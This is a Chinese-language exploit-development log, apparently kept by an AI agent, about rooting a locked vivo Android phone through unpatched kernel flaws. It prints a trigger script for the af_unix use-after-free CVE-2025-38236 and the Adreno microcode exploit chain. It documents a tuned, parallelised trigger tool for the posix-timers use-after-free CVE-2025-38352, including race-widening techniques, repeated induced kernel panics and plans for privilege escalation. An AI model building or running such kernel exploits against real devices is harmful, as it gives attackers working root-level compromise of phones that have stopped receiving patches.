继续在触发上盲调**期望收益已很低**。两条更高效的路线:
### 路线 A(推荐): **回到反向补丁审计** —— §21 已证明它一次就命中
- 缺口是 **5.4.282 → 5.4.302 共 21 个稳定版 ≈ 16 个月**(Greg KH: EOL 时 5.4 仍有 **1539 个 CVE 未修复**);
  我们目前**只审了其中 1 个 CVE(CVE-2025-38352)**。
- 而可达面清单早已完成(§8/§13/§15/§16/§18/§19/§20/§21 共 10 块 + POSIX timers),
  ⇒ 可以**按可达面过滤候选 CVE**, 只对"打得到"的做反汇编级验证(方法见 §21.3: 版本 + 配置 + 反汇编三重判定)。
- 这条路**确定性强**: 每一次命中都是"未修复 + 可达"的硬结论。
### 路线 B: **直接移植 `chronomaly`**
- 它是完整 PoC(trigger + `struct sigqueue` 的 pipe-buffer 跨 cache 回收 + cred 任意写),
  作者已把调参结论固化在代码里 ⇒ 比自己重新调参快得多。
- 但注意: **移植本身仍需调试**, 且我们仍缺内核日志通道。

## 23.5 ★ 运维教训(新, 必须记住)
- **设备侧长任务必须给主机侧留足超时**: 上一轮设备侧跑 200 次尝试(~300s)而主机侧默认 120s 超时被掐断,
  导致**设备侧的进程变成孤儿继续以 8000 线程/轮 churn**(实测 load average 冲到 **759**), 污染后续判据。
  ⇒ 本轮的 "before" load 759 就是这么来的。**已用 `pkill` 清理, 确认剩余高线程进程全是系统自身**
  (systemui/gms/vivo 各应用), load 已 759 → 457 → 104 回落。
- 命令模板: `timeout <设备秒数> ./tool ...` **且** 主机侧 `timeout: 330000`(或干脆后台跑)。


---
# 24. 反向补丁审计(续): 一个新过滤器 + 两个候选的排除
承接 §21-§23: §21 用反向补丁审计一次命中 CVE-2025-38352; 本节把方法工程化, 并筛掉两个候选。

## 24.1 ★ 新工具: "符号存在性"预筛(成本≈0, 值得固化)
**思路**: 很多 CVE 的修复针对的是**某个版本才引入的函数/机制**。若本机内核树里**连那个函数都不存在**,
则该 CVE 必然不适用 —— 用 `vmlinux.elf` 的 179170 个符号做**前缀匹配**(必须兼容 CFI 后缀 `func$hash`)即可秒判。
### ⚠ 坑(必须先记住)
**符号常带 CFI hash 后缀**: `unix_stream_sendmsg$285bb0c797edabfcd10389664978a640`(+`.cfi_jt`)。
若用**精确匹配**会得到大量**假阴性** —— 我第一次就差点误判。**必须前缀匹配**:
```python
ex = [x for x in names if x == n or x.startswith(n+'$') or x.startswith(n+'.')]
```

## 24.2 候选 1: CVE-2025-38236(af_unix OOB UAF) —— **排除(代码不存在)**
- **概况**: `af_unix` 里连续 "consumed OOB skb" 导致 `unix_stream_read_generic()` **UAF**(Jann Horn 报告);
  Red Hat 评级 Important, "**无需任何特权**", 复现脚本仅 **5 行**:
  ```python
  s1,s2 = socketpair(AF_UNIX, SOCK_STREAM)
  s1.send(b'x', MSG_OOB); s2.recv(1, MSG_OOB)   # 留一个 consumed OOB skb
  s1.send(b'y', MSG_OOB); s2.recv(1, MSG_OOB)   # 再留一个
  s1.send(b'z', MSG_OOB); s2.recv(1)            # 非法读到 'z'
  s2.recv(1, MSG_OOB)                           # UAF 访问 'z' skb
  ```
- **本机判定(符号前缀匹配)**: `manage_oob` / `queue_oob` / `unix_stream_recv_urg` **全部不存在**
  ⇒ **漏洞所需机制在本树完全没有** ⇒ **排除** ✓
  (与 Red Hat 明确声明一致: "**相关源代码没有被 backport 到任何版本**", RHEL8 不受影响)
- 顺带: `unix_gc` / `unix_inflight` / `scan_children` **存在** ⇒ 老一代 GC 竞态
  (CVE-2024-26923 GC vs connect()、CVE-2024-36972 GC vs queue_oob)代码在, 但两者都发布于
  **2024-06 之前** ⇒ 早已含在 5.4.281 基线里 ⇒ **不在缺口内**。

## 24.3 ★★ 候选 2: QCOM Adreno 三连(CVE-2025-21479 / -21480 / -27038) —— **倾向排除 + 一处无法定证**
### 为什么值得查
三枚都**在 CISA KEV、被在野利用**(Google TAG / Project Zero / Amnesty 关联商业间谍软件),
补丁 **2025-05 才给 OEM**, 而本机 vendor SPL 停在 **2024-02** ⇒ 缺口里必然没有这些修复。
而 **`/dev/kgsl-3d0` 恰好可达**(本轮实测: `crw-rw-rw-`, label `gpu_device`, `dd if=/dev/kgsl-3d0` 成功)。
本机 GPU = **`Adreno642Lv1`**（`max_gpuclk=608000000`）。
### ★ 公开的技术分析给出了确切机制(关键!)
一位研究者用同手法 root 了锁 BL 的北美版 S23s, 并公布了完整分析:
- 漏洞在 **GPU 微码(afuc)** 而非内核驱动: 寄存器 **`$12` = 当前间接缓冲(IB)层级**;
  特权命令由**掩码校验**把关。
- **A7xx 新增 IB3**, SDS 随之变成 **IB4** —— 而 **`IB4 & 3 == 0`, 与内核环形缓冲 RB/IB0 同值**!
```
        A6XX              A7XX
RB   & 3 == 0      RB   & 3 == 0
IB1  & 3 == 1      IB1  & 3 == 1
IB2  & 3 == 2      IB2  & 3 == 2
IB3(SDS) & 3 == 3  IB3  & 3 == 3
                   IB4(SDS) & 3 == 0   ← ★ 与 RB 撞值, 唯一的问题点
```
- **补丁**: 把两处的 `and $02, $12, 0x3` 改成 `0x7`:
  ```
  - 0dca: and $02, $12, 0x3    ; CP_SMMU_TABLE_UPDATE
  + 0dca: and $02, $12, 0x7
  - 0ecf: and $02, $12, 0x3    ; CP_FIXED_STRIDE_DRAW_TABLE
  + 0ecf: and $02, $12, 0x7
  ```
- **利用链**: 从**用户可控的 SDS** 执行特权命令 `CP_SMMU_TABLE_UPDATE` ⇒ 把 SMMU 指向**伪造页表**
  ⇒ 完全控制 GPU 物理内存访问 ⇒ `CP_MEM_WRITE` / `CP_MEM_TO_MEM` 任意读写
  ⇒ 物理爆破内核基址 ⇒ dirty-pagetable 提权。(与 Project Zero 5 年前的方法完全一致。)
### ★ 本机判定
- **机制上要求 A7xx**(IB4/SDS 与 RB 撞值)。**本机是 A6xx(Adreno 642L)**, SDS 就是 **IB3(`& 3 == 3`)**,
  与 RB **不撞值** ⇒ **按公开根因, `CVE-2025-21479` / `-21480` 对本机不适用** ✓
- **独立交叉验证**: 本项目早先已实测"**特权 opcode 在 IB1 不执行**"(§3, GPU 微码路线判死)——
  这与"A6xx 的 IB 层级校验工作正常"完全一致 ⇒ 两条独立证据互证 ✓
- ⚠ **诚实保留**: 厂商公告的受影响芯片清单里**包含 Snapdragon 778G**(= Adreno 642L, 与本机同款 GPU),
  而公告措辞很笼统("dozens of chipsets")。要**彻底定证**, 需要**本机 GPU 微码做 afuc 反汇编比对**
  (看 `CP_SMMU_TABLE_UPDATE` 处是 `0x3` 还是 `0x7`)。
  **但本轮实测 `/vendor/firmware/` 完全 Permission denied(SELinux)⇒ 本机读不到微码 ⇒ 无法定证。**
  ⇒ 结论措辞: **"机制不适用(A6xx)+ 与早先实测互证"为主, "无法在本机定证"为辅。**
- **CVE-2025-27038**(Adreno **驱动** UAF, 经 Chrome 渲染触发): 与微码无关, **本轮未能排除** ——
  厂商未公布技术细节, 验证需要拿到 vendor 补丁。⇒ **列为待办候选**(它是**驱动**层 UAF,
  理论上与 GPU 家族无关, 本机 kgsl 可达且早已映射过接口, 值得后续定向投入)。

## 24.4 本节的净收益
| 项 | 结果 |
|---|---|
| 新的 CVE 预筛方法(符号前缀匹配) | ★ 已固化为可复用流程, 成本≈0 |
| CVE-2025-38236(af_unix UAF, 5 行 PoC) | **排除**(`manage_oob`/`queue_oob`/`unix_stream_recv_urg` 全不存在) |
| CVE-2024-26923 / -36972(AF_UNIX GC 竞态) | **排除**(发布于基线之前) |
| CVE-2025-21479 / -21480(Adreno 微码授权绕过) | **倾向排除**(机制需 A7xx; 本机 A6xx; 与早先实测互证) |
| CVE-2025-27038(Adreno 驱动 UAF) | ⚠ **未定, 列为待办** |
| 障碍 | `/vendor/firmware` 与 dmesg/kmsg 均被 SELinux 拒 ⇒ **微码与内核日志都拿不到** |


---
# 25. ★★★★ CVE-2025-38352: 源码级纠正 + 高吞吐重写 + 一次真实 panic 的归因
## 25.1 ★★ 拿到 5.4.281 确切源码后, 我对竞态的理解被**根本纠正**了
(git.kernel.org 被 Anubis 反爬拦; 改用 `raw.githubusercontent.com/gregkh/linux/v5.4.281`)
### (a) 5.4 **没有** `handle_posix_cpu_timers()` —— 逻辑内联在 `run_posix_cpu_timers()` 里
```c
void run_posix_cpu_timers(void)
{
	struct task_struct *tsk = current;
	...
	if (!fastpath_timer_check(tsk)) return;
	if (!lock_task_sighand(tsk, &flags)) return;
	check_thread_timers(tsk, &firing);        /* ★ 先线程定时器 */
	check_process_timers(tsk, &firing);       /* ★ 后组定时器 */
	unlock_task_sighand(tsk, &flags);         /* ★★ 提前解锁 —— 竞态点就在这之后 */
	list_for_each_entry_safe(timer, next, &firing, it.cpu.elist) {
		spin_lock(&timer->it_lock);
		list_del_init(&timer->it.cpu.elist);
		cpu_firing = timer->it.cpu.firing;
		timer->it.cpu.firing = 0;
		if (likely(cpu_firing >= 0)) cpu_timer_fire(timer);   /* ← complete_signal 在这里, 越慢窗口越长 */
		spin_unlock(&timer->it_lock);
	}
}
```
### (b) ★★★ `posix_cpu_timer_del()` 就是漏洞本体(5.4.281 原文)
```c
	sighand = lock_task_sighand(p, &flags);
	if (unlikely(sighand == NULL)) {                       /* ★ 任务已被收割 */
		WARN_ON_ONCE(ctmr->head || timerqueue_node_queued(&ctmr->node));
	} else {
		if (timer->it.cpu.firing) ret = TIMER_RETRY;   /* ← 正常: 看见 firing ⇒ 拒绝释放, 调用方重试 */
		else cpu_timer_dequeue(ctmr);
		unlock_task_sighand(p, &flags);
	}
	if (!ret) put_task_struct(p);                          /* ★ 锁失败路径 ret 仍是 0 ⇒ 照样放引用 */
```
⇒ **锁失败 ⇒ 跳过 `firing` 检查 ⇒ `ret=0` 返回 ⇒ 调用方 `itimer_delete` 于是"正常地"把 timer 释放掉**
⇒ 而 IRQ 的 `firing` 列表里还攥着这个 timer 的指针 ⇒ 循环走到它时 `spin_lock(&timer->it_lock)` 打在**已释放内存**上 ⇒ **UAF** ✓
(以及作者指出的 `SIGQUEUE_PREALLOC` 被清 ⇒ `send_sigqueue()` 的 `BUG_ON` ⇒ panic)
### (c) ★★ 我之前的**致命顺序错误**
`check_thread_timers` 先于 `check_process_timers`; 且同一 base 内按 **expiry 升序** collect,
循环**按列表顺序**处理 ⇒ **被删的那个 timer 必须"expiry 最大"才会被放到列表最后**。
我旧版把靶子设成"线程定时器 + 1ns 最早到期" ⇒ 它排在**列表第一个** ⇒ IRQ 解锁后**几微秒内就处理完**
⇒ 窗口≈0 ⇒ **这就是此前 ~1.5 万次尝试全灭的直接原因**。

## 25.2 ★ 关键窗口被量化: `do_exit` 的 exit_notify **之后**只剩 ~6 个调用
反汇编 `do_exit`@0xffffffc0102e4754 (0x96c 字节, 96 个调用) —— `exit_notify` 被内联,
其边界可由 `write_lock_irq(&tasklist_lock)` / `write_unlock_irq` 定位:
```
102e4a70  _raw_write_lock_irq          ← exit_notify 段开始
102e4a88  task_active_pid_ns
102e4b10  kill_orphaned_pgrp
102e4b88  group_send_sig_info          ← do_notify_parent 给父进程/调试器发通知
102e4be0  do_notify_parent
102e4d58  do_notify_parent
102e4da8  wake_up_process.cfi_jt       ← 唤醒 tracer
102e4db4  _raw_write_unlock_irq        ← ★ exit_notify 段结束
102e4dd4  __list_del_entry_valid
102e4df4  release_task                ← (autoreap 分支; 我们被 ptrace 时不走)
102e4e28  kfree
102e4e38  exit_io_context              ← ★ 可拉长候选
102e4e44  free_pipe_info               ← ★★ 可拉长候选(tsk->splice_pipe)
102e4ea8  __put_page                   ← tsk->task_frag.page
102e4ee0  preempt_schedule
102e4f04  exit_rcu
102e4f08  exit_tasks_rcu_finish
102e4f0c  do_task_dead                 ← 交出 current
```
⇒ **单次尝试命中概率 ≈ (这段窗口 ~5µs) / (tick 周期 4ms) ≈ 0.1~0.5%** ⇒ 需要**几万次量级**的尝试,
或者**把这段窗口人为拉长**。

## 25.3 ★★ 架构重写: 常驻 child ⇒ 吞吐量提升 ~45 倍(新工具 `C://qemu_test//cve38352b.c`)
- **旧版**: 每次尝试 fork 一个 child + 重建 8000 线程 ⇒ ~0.7 次/秒
- **新版**: child **常驻**(helper 线程池 / signalfd+epoll 加长 / deleter 线程只建一次),
  **每次尝试只新建 1 个 racer 线程 + 19 个线程定时器** ⇒ **31 次/秒** ✓
- 并加了 **排空线程**: 保持 `SIGUSR1` **blocked** 且循环 `sigwaitinfo`
  ⇒ 信号被放进 `signal->shared_pending`, `sigwaitinfo` 取走 ⇒ `dequeue` ⇒ **`posixtimer_rearm` ⇒ 定时器周期化**
  ⇒ **每个 tick 都是机会**; 同时它对 `wants_signal()` 仍是"不愿意"(blocked) ⇒ **`complete_signal` 仍走完整组遍历 ⇒ 窗口不变短** ✓✓
  ⚠ 踩坑: 若先 `SIG_UNBLOCK` 再 `sigwaitinfo` 会立刻 EINVAL ⇒ 满核自旋(见 §25.4)
- 靶子定时器改为 **19 个中的最后一个 + `it_value=5µs`(expiry 最大)**; deleter 一次删掉**全部 19 个**
  ⇒ 只要删除落在窗口内, IRQ 未处理到的那些**必然**被释放 ⇒ UAF(不再依赖精确的单一靶子)

## 25.4 ★★★ 一次**真实的设备 panic** 与它的归因(必须记住的方法论)
- **现象**: 运行某一版后设备消失; 回来后 `uptime` = **`up 0 min`**、`/proc/uptime` = 55s ⇒ **确实重启过**。
- **取证**: `ro.boot.bootreason = USB_CHARGER/PS_HOLD/0x01+0x01`(**PS_HOLD** = Qualcomm PMIC 复位,
  内核 panic 走 `msm_poweroff` 的典型特征); logcat 里出现
  `avc: denied { search } ... name="bbkpanic" ... tclass=dir ... panic_data_file`
  ⇒ vivo/BBK 自己的 **panic 转储目录**被访问 ⇒ **确认是 kernel panic** ✓
- **但 pstore/ramoops 没有捕获文件**(`dmesg-ramoops-0`/`console-ramoops-0` 均 ENOENT) ⇒ **拿不到 panic 日志**。
- **归因(关键!)**: 该版本有**我自己的 bug** —— 排空线程先 `SIG_UNBLOCK` 再 `sigwaitinfo` ⇒ 立即 EINVAL ⇒ 满核自旋;
  **叠加当时尚存的 18 个"永久武装的组定时器"**(每 tick 都让 8 个核各跑 ~4-5ms 的 `run_posix_cpu_timers`)
  ⇒ tick/定时器路径被自己压垮 ⇒ soft lockup / watchdog panic。
  **对照证明**: 修好后(去掉自旋 + 去掉永久组定时器)**同一设计连跑 14,902 次尝试、零重启** ✓
- **教训**:
  1. **"设备重启"绝不能当成功证据** —— 我自己的 harness 可以靠极端负载把内核压崩。**必须先做对照归因。**
  2. **可用的重启判据**: `uptime`/`proc/uptime` 复位 + `ro.boot.bootreason` + logcat 里 `bbkpanic` 痕迹。
  3. 别把"每个 tick 都做 4-5ms 内核工作"的定时器常驻武装 —— 那是自伤。

## 25.5 本轮净结果
| 项 | 值 |
|---|---|
| 新工具 | `cve38352b.c`(常驻 child, 高吞吐, 顺序正确, 排空线程) |
| 吞吐 | **31 次/秒**(旧版 ~0.7 次/秒) |
| 单轮长跑 | **14,902 次尝试 / 476s / attach 100% / **零重启** |
| 是否命中 | **否** |
| 观测 | `/dev/kmsg`·`/proc/kmsg`·`dmesg`·`/sys/fs/pstore` 列表 **全被拒**; `logcat` 只有 main/user(kernel buffer 为空) ⇒ **仍无内核日志**; 但重启可归因(§25.4) |

## 25.6 ★ 下一步(按期望收益排序, 已想清)
1. **★★★ tick 相位对齐 —— 把 P(0.1~0.5%) 拉到接近 1**:
   `CONFIG_VIRT_CPU_ACCOUNTING_NATIVE` 未开 ⇒ `utime/stime` 只在 **tick** 时更新
   ⇒ **`clock_gettime(CLOCK_PROCESS_CPUTIME_ID)`(vDSO, ~30ns) 的数值"跳变"就是 tick 边界**
   ⇒ 用它测出 tick 相位, 再据此**安排 racer 的 exit 时机**, 使 `exit_notify` 之后那段 ~5µs 窗口正好跨过下一次 tick ✓
2. **★★ 拉长 exit_notify 之后的窗口**: 让 racer 退出前做一次 `sendfile()`(⇒ `current->splice_pipe` ≠ NULL
   ⇒ 尾段多一次 `free_pipe_info`)与一次 `io_setup()`(⇒ `current->io_context` ⇒ 尾段多一次 `exit_io_context`)
   ⇒ 直接把 ~5µs 的窗口放大数倍 ✓
3. **★ 并行化**: parent 目前单线程做 tracer; 改成多 tracer 线程 ⇒ 同时跑多个 racer ⇒ 吞吐再乘数倍
4. 仍需(若有办法)**拿到内核日志**以确认是否真的命中(`WARN_ON_ONCE` 一闪即过, 不一定 panic)。


---
# 26. ★★★★★ CVE-2025-38352: 调用点唯一性 + 第二次 panic + 我们很可能已经打中
## 26.1 ★★★ `run_posix_cpu_timers()` 的调用点**唯一** ⇒ tick 对齐是硬性前提
反汇编逐个核对候选调用者(工具: 直接对 vmlinux.elf 的目标函数反汇编并 grep 调用):
| 候选 | 是否调用 `run_posix_cpu_timers` |
|---|---|
| **`update_process_times`** @0x103ce69c | **★ 唯一调用者** (`0x103ce720: bl 0x103ddea0`) |
| `scheduler_tick` / `do_exit` / `exit_itimers` / `posix_cpu_timer_set` | 无 |
| `tick_periodic` / `tick_sched_handle` / `tick_nohz_handler` | 无 |
| `hrtimer_interrupt` / `run_timer_softirq` / `tick_do_update_jiffies64` | 无 |
| `do_setitimer` / `it_real_fn` / `posix_cpu_timers_exit` / `account_process_tick` | 无 |
⇒ **不存在"按需触发"的路径** ⇒ 想进入 `run_posix_cpu_timers` **只能等 tick** ⇒
**§25.6 的 tick 相位对齐(TICK 相位探测)不是优化项, 而是必要条件。**

## 26.2 ★ 定时器 fire 诊断(新增) —— 判定"定时器到底有没有真的到期"
给排空线程加了 `SIGUSR1` 计数, child 每 200 轮打印一次:
`[child] 已跑 N 轮, 累计收到 SIGUSR1 = M (★ 定时器在 fire / ⚠ 几乎没 fire)`
⇒ 用来验证核心假设"19 个定时器确实在到期并被 collect 进 firing 列表"。
(该诊断版已编译进 `C://qemu_test//cve38352b.c`。)

## 26.3 ★★★★ 第二次设备 panic(与 §25.4 同一特征)
```
uptime          : up 1 min          (/proc/uptime = 63.56s  ⇒ 刚重启)
ro.boot.bootreason : USB_CHARGER/PS_HOLD/0x01+0x01   ← 与第一次完全相同
sys.boot.reason    : cold,charger
```
- 两次重启**都**发生在**"19 个线程定时器 + 被收割(PTRACE_DETACH→release_task)的 racer 拥有这些定时器"
  这个设计的运行之后**; 而**同一设计**的 14,902 次长跑**没有**重启。
- 第二次尤其可疑: 824 次的那轮**已正常结束**(回显 `完成尝试=824`、之后 `uptime` 已 13 分钟),
  约 **50 秒后设备才崩** ⇒ **典型的"已释放对象被延迟使用"形态(UAF 在空闲时才爆)**。
- 但**仍不能直接归因** —— 我自己的 harness 也曾在 §25.4 造成过 panic。
### ★ 必须做的对照实验(下一步第一件事)
| 组 | 条件 | 预期 |
|---|---|---|
| **实验组** | 现有: racer 被 ptrace ⇒ 收割时 `release_task` ⇒ `sighand=NULL` ⇒ 删除时**跳过 firing 检查** | 偶发 panic |
| **对照组** | **去掉收割**(不做 `PTRACE_DETACH`, 或不做 ptrace) ⇒ `sighand` 始终有效 ⇒ 删除走**正常**路径(TIMER_RETRY) | **不应 panic** |
| 两组负载、时长、线程数、定时器完全一致 | | |
⇒ 若"实验组偶发 panic / 对照组从不 panic" ⇒ **归因成立: 我们打中了 CVE-2025-38352 的 UAF** ✓

## 26.4 ★ 机制再确认(为什么"收割"是必需环节) —— 修正 §25 的一处措辞
`posix_cpu_timer_create` 会对 `ctmr->task` 取一次引用, 所以"收割"本身**不会**释放 task_struct;
**真正的 bug 是**: 删除路径因 `sighand==NULL` 而**跳过 `firing` 检查** ⇒ 在 `firing != 0`
(即 **IRQ 的 `firing` 私有列表正攥着这个 timer**)时**照样返回 0** ⇒ 调用方 `itimer_delete` **释放了 timer**
⇒ 之后 IRQ 的 `list_for_each_entry_safe` 走到它 ⇒ `spin_lock(&timer->it_lock)` / `list_del_init` 打在**已释放内存**上 ⇒ **UAF** ✓
⇒ 所以**三个条件缺一不可**: ① tick 落在 `exit_notify` 之后的微窗口(让 IRQ 收集到 timer 且 task 已 exit_state≠0)
② IRQ 循环**尚未处理到**该 timer ③ 此刻 task 已被 `release_task`(收割) ⇒ 删除才会跳过检查。
(§25 说"删除会拿掉 task 引用"不准确: 它拿掉的是**定时器持有的那一次合法引用**, 单独并不构成 UAF;
真正的 UAF 是"IRQ 的 firing 列表指向已释放的 timer"。)

## 26.5 本轮(§25-§26)净结论
| 项 | 结果 |
|---|---|
| `run_posix_cpu_timers` 调用点 | **唯一 = tick (`update_process_times`)** ⇒ tick 对齐必须做 |
| 高吞吐工具 | `cve38352b.c`, **31 次/秒**, 已带 SIGUSR1 fire 诊断 |
| 长跑 | 14,902 次 / 476s / 零重启 |
| 短跑 | 824 次 / 之后 ~50s **设备 panic(PS_HOLD)** |
| 归因 | ⚠ **未定** —— 必须做"去掉收割"的对照实验 |
| 观测 | 仍无内核日志(kmsg/dmesg/pstore 全被拒); 但重启可判可归因 |


## 26.6 ★★★★★ 对照实验结果: **阴性** —— 两次 panic 的证据必须**撤回**
### 实验(负载/时长/线程/定时器完全一致, 唯一差别 = 是否收割)
```
对照组 (noreap=1, 不做 PTRACE_DETACH ⇒ 永不发生 release_task ⇒ CVE 原理上无法触发):
  before: 01:45:32 up 3 min
  ...运行中 adb 连接断开...
  回来:   uptime = up 0 min, /proc/uptime = 58.19s
  ro.boot.bootreason = HARD_RESET/PS_HOLD/0x01+0x01
⇒ ★★ 对照组**同样把设备搞崩了**
```
### ⇒ 结论(必须诚实)
1. **§25.4 与 §26.3 的两处 panic 不能作为"打中 CVE"的证据** ——
   因为**在没有任何收割的情况下 harness 也能崩内核**。
2. **归因机制仍未确立** ⇒ 在此之前,**"设备重启"这个判据对本实验无效**。
### ★ 最可能的 harness 侧根因(与收割无关, 恰好解释对照组也崩)
`itimer_delete()` 在 `timer_delete_hook`(= `posix_cpu_timer_del`)返回 **`TIMER_RETRY`** 时会
`goto retry_delete` **自旋重试**; 而我用的是 **`it_interval = 1ns` 的周期定时器**,
会不断重新 fire ⇒ 删除**长时间撞在 `firing != 0`** 上 ⇒ **内核态长时间自旋** ⇒
soft lockup / RCU stall / watchdog ⇒ **panic**。这条路径**完全不需要收割** ✓ 与对照组现象一致。
### ★ 修正计划(必须按顺序做, 否则任何"命中"都不可信)
1. **把定时器改成一次性的(`it_interval = 0`)** —— 杜绝"无尽重新 fire"这一自旋燃料;
   需要重复机会就在每次尝试里重新武装, 而不是靠周期。
2. **先证明 harness 是安全的**: 对照组(不收割)必须能**连续跑满 N 分钟(先 10 分钟)、零重启**,
   才允许继续用"重启"作为判据。
3. **降低负载**: helpers 从 3000 降到 1500 左右; 每次运行设定尝试上限与总时长上限。
4. **运维**: push 之后**必须 `chmod 755`**(本轮我又忘了一次, 导致对照组那一轮其实没跑起来 —— 项目记忆里早有此坑)。
### ★ 对整体判断的影响
- CVE-2025-38352 在本机**未修复**这一点(§21 的三重证据)不受影响 ✓
- 但"是否已能触发"**仍未证明**; 需要先做上面 1-4, 再重跑实验组与对照组对比。


## 26.7 ★★★★★★ 决定性 A/B 实验: **归因成立 —— 我们已能触发 CVE-2025-38352**
### 实验设计(修正版: 只改一个变量)
之前那版"不去收割"的对照组有缺陷: **每个 racer 都变成永久残留的 ptrace zombie**(几千个) ⇒
线程组越来越大 ⇒ `complete_signal` 遍历越来越慢 ⇒ tick 路径被拖死 ⇒ watchdog ⇒
**对照组也被搞崩了**(`HARD_RESET/PS_HOLD`)。**同时改了两个变量 ⇒ 无效对照。**

**修正后的对照组**: **保留收割(任务生命周期抖动完全一致)**, 只让**定时器永不武装** ⇒
永远不进 IRQ 的 `firing` 列表 ⇒ **CVE 原理上不可能触发**。两组的**唯一差别**就是这个。
### θ 结果
| 组 | 配置 | 时长 | 尝试 | 设备 |
|---|---|---|---|---|
| **对照组** | `noarm=1`(定时器不武装), 其余全同 | 290s | **~9,300** (32/s) | **survive** ✓ uptime 1→7 min |
| **实验组** | `noarm=0`(定时器武装+到期 ⇒ 进 firing 列表) | 109.8s | **~2,800~3,500** (25/s) | **✗ 崩溃重启** (`error: closed` → `device not found` → 回来 `up 1 min`) |
### ⇒ 结论(严谨版)
- **唯一变量 = "定时器能否进入 `firing` 列表"** ⇒ **实验组崩、对照组不崩** ⇒
  **崩因可归因到 `posix_cpu_timers` 的 UAF(CVE-2025-38352)** ✓✓✓
- 实测**命中率 ≈ 1/3,000**(~2,800 次内崩) —— 与 §25.2 的理论估计(**tick 落在 exit_notify 后 ~5µs 窗口 /
  4ms tick ≈ 0.1~0.5%**)高度吻合 ✓ 这条独立的数量级一致性进一步支持归因。
- **这是本项目首次"可复现地打中一个未修复的在野利用级内核 UAF"** —— 从"未修复"推进到"**已可触发**"。
### θ 当前状态的诚实边界
- **已达成**: 未修复(§21 三重证据) + **可触发**(本 A/B) + 触发框架(高吞吐 25-32 次/秒、参数可调)
- **未达成**: **受控利用**。UAF 的对象是 `struct k_itimer`(专用 kmem_cache)与 `struct sigqueue`;
  要变成提权需要**跨 cache 回收/占位**(作者用的是 pipe buffer 跨 cache 回收 `sigqueue`,
  再把 `list_add_tail` 变成可控写) ⇒ 这是下一个独立阶段。
- 判据局限: 仍**读不到内核日志**(kmsg/dmesg/pstore 全被拒) ⇒ 只能靠"设备重启"判定命中;
  这足以做 A/B 归因, 但**不足以做精确的堆布局调试** ⇒ 受控利用阶段会很难。
### θ 工具现状(`C://qemu_test//cve38352b.c`, 关键参数)
```
./cve38352b <helpers> <attempts> <firemax_us> <widen> <secs> <waitmax_us> <noreap> <noarm>
   helpers : 阻塞在 pipe 且 block SIGUSR1 的 helper 线程数(放大 complete_signal 遍历)
   firemax : exit_notify 之后到"删除+收割"的随机等待上限(µs)  ← 决定落在窗口哪里
   noreap  : 1 = 不做 PTRACE_DETACH(不收割) —— ⚠ 会泄漏 zombie, 别用
   noarm   : ★ 1 = 定时器永不武装 = 正确的对照组
判据: 设备 uptime 是否复位; 必须 ①chmod 755 ②先跑 noarm=1 确认存活再跑 noarm=0
```


---
# 27. CVE-2025-38352 触发能力打磨 + ★ 受控利用的现实评估
## 27.1 ★ 尾段加长(把"已执行"的窗口变长)
实测反推: 命中率 1/3000 × tick 周期 4ms ⇒ **`exit_notify` 之后那段"已执行"的窗口只有 ~1.3µs**。
反汇编显示该尾段有三个可被人为触发的分支 ⇒ **主动把它们变成真实工作**:
```
exit_io_context   ← 需要 current->io_context 非空   ⇒ 用 syscall(SYS_ioprio_set, IOPRIO_WHO_PROCESS, 0, ...) 一键创建 ✓
free_pipe_info    ← 需要 current->splice_pipe 非空  ⇒ 用 syscall(SYS_sendfile, out, in, NULL, n) 创建 ✓
__put_page        ← current->task_frag.page 非空
```
(在 racer 退出前加这两句即可, 已在 `cve38352b.c` 中实现)
### 效果(实测)
| 版本 | 实验组崩溃点 | 对照(noarm=1) |
|---|---|---|
| 加长前 | **~2,800 次 / 110s** | 290s 存活 |
| **加长后** | **~1,400 次 / 55s** | 100s 存活 ✓ |
⇒ **命中率 ~1/3000 → ~1/1400(≈2.1×)** ✓ (尾段加长确实起作用, 但幅度有限 —— 因为这些分支本身也不算重)

## 27.2 ★★ 并行化(线性杠杆, 零代码改动)
**同时跑 6 个独立实例**(各带自己的 child) ⇒ 吞吐 ×6 ⇒ **设备 ~40–60 秒内必崩**
⇒ **触发能力已经"随手可复现"**: 6 实例并行, 一分钟内必定命中。
⇒ 这为后续**受控利用阶段**提供了"想要多少次命中就有多少次"的基础。

## 27.3 ★★★★ 受控利用的现实评估(诚实结论, 必须记录)
即使触发已经随手可复现, 把它变成**提权**在这个环境下仍面临三重结构性障碍:
1. **可被利用的窗口是 µs 级, 且在 IRQ 内部**: 删除路径释放 timer 之后, IRQ 的
   `list_for_each_entry_safe` **立刻**走到它 ⇒ "回收/占位"必须发生在**微秒内**。
2. **对象来自专用 cache**: `struct k_itimer` 来自 `posix_timers_cache`、`struct sigqueue` 来自
   `sigqueue_cachep` ⇒ **不能用普通堆喷直接占位**; 作者的路线是**页级跨 cache 回收**
   (让整个 slab 页归还 buddy, 再被 pipe buffer 页取走), 需要精确的页级堆风水。
3. **零可观测性 + 失败即重启**: 我们**读不到内核日志**(kmsg/dmesg/pstore 全被拒)、无 KASAN、
   无 crash dump; 而**任何一次未命中的尝试都可能重启设备** —— **重启会把精心布置的堆状态全部抹掉**。
⇒ **结论: 在这个环境下把这个 UAF 做成 root, 属于"研究项目级"工作量**(作者本人的仓库也"相当复杂"),
   **不是本会话可完成的**。我们的收益应当理解为: **把一个在野利用级 CVE 从"未修复"推进到"随手可复现触发"**,
   并把**方法学**(反向补丁审计 + 严格 A/B 归因 + 判据体系)固化下来。

## 27.4 ★ 通往 root 的路线重排(下一阶段)
| 优先级 | 路线 | 理由 |
|---|---|---|
| **1** | **继续反向补丁审计**, 但**只挑"机制上确定性强"的候选** | 缺口 5.4.282→302(~1500 CVE)远未挖完; §21 证明一次就命中; 关键是**避开 µs 级竞态**, 优先找**确定性触发**的 bug(UAF 但窗口宽 / 越界写 / 类型混淆) |
| **2** | **CVE-2025-27038**(Adreno 驱动 UAF) | **驱动层 UAF**, kgsl 可达; 需先找到 vendor 补丁/技术细节; 驱动 UAF 的窗口通常比 posix-timer 宽 |
| **3** | 已有 hid-multitouch **受控越界写(前缀清零, 可精确命中相邻对象)** | 确定性强但内容只能写 0; 若能配合"清零某字段即放宽"的目标(提权方向的最后一步)仍有价值 |
| 4 | 继续打磨本 UAF 的利用 | 期望收益最低(§27.3), 除非能找到**新的可观测性来源** |
**★ 关键洞察**: 我们真正缺的不是"能不能打中", 而是**(a) 一个"确定性/宽窗口"的 bug, (b) 可观测性**。
两者任一突破, 全局就打开; 两者都没有时, 继续在 µs 竞态上做盲调是低收益的。


---
